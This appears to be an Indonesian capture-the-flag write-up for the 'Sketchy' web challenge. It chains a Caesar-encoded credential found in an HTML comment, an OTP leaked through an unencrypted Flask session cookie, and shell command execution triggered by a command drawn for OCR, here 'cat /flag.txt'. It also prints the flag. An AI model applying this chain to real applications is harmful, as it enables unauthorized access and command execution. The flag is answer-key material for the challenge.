# Write-up — Sketchy

**Challenge:** Sketchy
**Category:** Web
**Flag:** `Thryve{75195673-bf87-4f43-b111-34ad7ce4013d}`

## Ringkasan

Aplikasi terlihat seperti sketchpad biasa. Namun, source HTML menyimpan credential tersembunyi dalam komentar. Setelah credential ditemukan, endpoint admin memiliki mekanisme OTP yang lemah karena OTP disimpan di Flask client-side session cookie. Setelah berhasil masuk ke halaman `/ai-reader`, fitur canvas mengirim gambar ke backend melalui WebSocket untuk dikenali sebagai teks. Tombol **Save** mengeksekusi teks hasil OCR sebagai perintah shell. Dengan menggambar `cat /flag.txt` pada canvas, flag berhasil dibaca.

Attack chain:

```text
HTML comment → Caesar decode → admin credential → /admin login
→ OTP leak in Flask session → /ai-reader
→ draw shell command → command execution → flag
```

---

## 1. Recon Halaman Utama

Halaman utama challenge dapat diakses melalui:

```text
http://1f70d528-8efa-47ec-8c8d-1224fc44e005.inst.thryvectf.org/
```

Pada source HTML ditemukan komentar:

```html
<!-- hktpu:GqD2lEki6WOe32GNBiD8EDrDfGMLJU -->
```

String tersebut terlihat seperti credential yang disamarkan. Bagian sebelum titik dua adalah `hktpu`, yang jika digeser Caesar `-7` menjadi `admin`.

Decode dapat dilakukan dengan script sederhana:

```python
s='hktpu:GqD2lEki6WOe32GNBiD8EDrDfGMLJU'
out=''
for c in s:
    if 'a' <= c <= 'z':
        out += chr((ord(c)-97-7)%26+97)
    elif 'A' <= c <= 'Z':
        out += chr((ord(c)-65-7)%26+65)
    else:
        out += c
print(out)
```

Output:

```text
admin:ZjW2eXdb6PHx32ZGUbW8XWkWyZFECN
```

Credential yang didapat:

```text
username: admin
password: ZjW2eXdb6PHx32ZGUbW8XWkWyZFECN
```

---

## 2. Mengakses Private JavaScript

Credential tersebut digunakan untuk membuka file JavaScript admin yang sebelumnya tidak langsung tersedia dari public page.

```bash
curl -i -u 'admin:ZjW2eXdb6PHx32ZGUbW8XWkWyZFECN' \
'http://1f70d528-8efa-47ec-8c8d-1224fc44e005.inst.thryvectf.org/static/script.js'
```

File `/static/script.js` menunjukkan bahwa halaman admin memakai WebSocket ke endpoint `/ws`.

Potongan penting:

```javascript
const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
const ws = new WebSocket(`${protocol}//${location.host}/ws`);

ws.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    if (msg.type === 'recognized') {
        currentText = msg.text || '';
        recognizedText.textContent = currentText || '—';
    } else if (msg.type === 'save_result') {
        saveResult.textContent = msg.result;
        saveResult.classList.remove('hidden');
    }
};

saveBtn.addEventListener('click', () => {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'save' }));
    }
});
```

Dari sini terlihat bahwa aplikasi menerima hasil OCR melalui message bertipe `recognized`, lalu tombol Save mengirim:

```json
{"type":"save"}
```

ke server.

---

## 3. Admin Login dan Clue Secret

Endpoint `/admin` menampilkan form login.

```bash
curl -i -s \
'http://1f70d528-8efa-47ec-8c8d-1224fc44e005.inst.thryvectf.org/admin'
```

Di bagian akhir HTML terdapat komentar:

```html
<!-- c291cA== -->
```

Base64 decode:

```bash
echo 'c291cA==' | base64 -d
```

Output:

```text
soup
```

Nilai `soup` adalah Flask secret key yang digunakan untuk menandatangani session cookie.

---

## 4. Login Admin dan Bypass OTP

Login dilakukan dengan credential hasil decode Caesar:

```bash
HOST='http://1f70d528-8efa-47ec-8c8d-1224fc44e005.inst.thryvectf.org'

curl -i -s -c cookies.txt -b cookies.txt \
  -X POST "$HOST/admin" \
  -d 'username=admin&password=ZjW2eXdb6PHx32ZGUbW8XWkWyZFECN'
```

Response login melakukan redirect ke `/otp` dan memberikan session cookie.

Session setelah login berisi data seperti:

```python
{'otp': '4420', 'user': 'admin'}
```

OTP disimpan langsung di client-side Flask session. Karena Flask session default bersifat **signed, bukan encrypted**, isinya dapat dibaca dari cookie.

Decode dapat dilakukan dengan:

```bash
flask-unsign --decode --cookie '<SESSION_COOKIE>'
```

Contoh output:

```text
{'otp': '4420', 'user': 'admin'}
```

OTP tersebut kemudian dikirim ke endpoint `/otp`:

```bash
curl -i -s -c cookies.txt -b cookies.txt \
  -X POST "$HOST/otp" \
  -d 'otp=4420'
```

Setelah OTP valid, session berubah menjadi:

```python
{
    'authenticated_admin': True,
    'otp': '4420',
    'user': 'admin'
}
```

Dengan session ini, endpoint `/ai-reader` dapat diakses.

---

## 5. Akses Halaman `/ai-reader`

Setelah login dan OTP valid:

```bash
curl -i -s -L -b cookies.txt "$HOST/ai-reader"
```

Halaman `/ai-reader` adalah versi admin dari sketchpad. Bedanya, halaman ini memiliki area hasil OCR:

```html
<div class="recognized-area">
    <span class="label">Understood:</span>
    <span id="recognized-text" class="value">—</span>
</div>
```

Selain itu tombol Save aktif dan memakai `/static/script.js`, bukan `/static/script-public.js`.

---

## 6. Analisis WebSocket

Ketika WebSocket dicoba dengan session admin valid dan langsung dikirim message:

```json
{"type":"save"}
```

Server membalas:

```json
{
  "type": "save_result",
  "result": "Draw the command first. Typed WebSocket commands are ignored."
}
```

Pesan ini mengonfirmasi dua hal:

1. Command tidak bisa dikirim langsung sebagai JSON WebSocket.
2. Command harus berasal dari teks yang digambar di canvas dan dikenali oleh OCR.

Percobaan menggambar otomatis melalui script menghasilkan OCR yang buruk, misalnya terbaca sebagai `1`, `=`, atau simbol lain. Karena itu eksploit paling stabil dilakukan manual melalui browser.

---

## 7. Eksploitasi melalui Canvas OCR

Langkah eksploitasi final:

1. Buka `/admin` di browser.
2. Login dengan credential:

```text
admin / ZjW2eXdb6PHx32ZGUbW8XWkWyZFECN
```

3. Ambil OTP dari session cookie menggunakan `flask-unsign --decode`.
4. Masukkan OTP pada halaman `/otp`.
5. Setelah masuk ke `/ai-reader`, gambar command pada canvas:

```text
cat /flag.txt
```

6. Pastikan bagian **Understood:** membaca command tersebut dengan benar.
7. Klik **Save**.

Server kemudian menjalankan command dan mengembalikan isi `/flag.txt`:

```text
Thryve{75195673-bf87-4f43-b111-34ad7ce4013d}
```

---

## Attack Chain

```text
HTML comment
    ↓
Caesar -7
    ↓
admin credential
    ↓
/admin login
    ↓
Flask session cookie
    ↓
OTP disclosure
    ↓
/otp
    ↓
/ai-reader
    ↓
Canvas OCR
    ↓
cat /flag.txt
    ↓
Command execution
    ↓
Flag
```

## Flag

```text
Thryve{75195673-bf87-4f43-b111-34ad7ce4013d}
```
